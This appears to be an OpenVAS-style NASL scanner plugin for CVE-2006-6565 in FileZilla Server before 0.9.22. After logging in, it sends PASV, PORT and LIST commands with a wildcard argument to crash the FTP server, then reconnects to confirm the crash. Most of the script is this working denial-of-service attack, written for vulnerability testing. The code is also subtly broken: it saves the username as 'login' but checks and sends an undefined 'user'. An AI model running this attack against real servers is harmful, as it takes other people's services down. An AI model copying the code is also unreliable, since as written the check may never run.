# SPDX-FileCopyrightText: 2010 LSS
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.102019");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-04-02 10:10:27 +0200 (Fri, 02 Apr 2010)");
  script_cve_id("CVE-2006-6565");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21542");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21549");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_name("FileZilla Server Port Command Denial of Service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 LSS");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/login", "ftp/password");

  script_tag(name:"solution", value:"Upgrade vulnerable FTP server to latest version.");

  script_tag(name:"summary", value:"FileZilla Server before 0.9.22 allows remote attackers to
  cause a denial of service (crash) via a wildcard argument to the (1) LIST or (2) NLST commands,
  which results in a NULL pointer dereference, a different set of vectors than CVE-2006-6564.

  NOTE: CVE analysis suggests that the problem might be due
  to a malformed PORT command.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];
if (!user) exit(0);
if (!pass) exit(0);

attack = "A*";

port = ftp_get_port( default:21 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

is_alive = ftp_recv_line(socket:soc);
if(!is_alive)exit(0);

###################
###step 1: login###
###################

cmd = "USER " + user;
ftp_send_cmd (socket:soc, cmd:cmd);

cmd = "PASS " + pass;
ftp_send_cmd (socket:soc, cmd:cmd);

########################
###step 2: the attack###
########################

cmd = "PASV " + attack;
ftp_send_cmd (socket:soc, cmd:cmd);

cmd = "PORT " + attack;
ftp_send_cmd (socket:soc, cmd:cmd);

cmd = "LIST " + attack;
ftp_send_cmd (socket:soc, cmd:cmd);

###############################
###step 3: attack succeeded?###
###############################

close(soc);

sleep(5);

soc1 = open_sock_tcp(port);
is_alive = ftp_recv_line(socket:soc1);

if (!is_alive) {
  security_message(port:port);
}

#end of exploit, closing open socket

close(soc1);
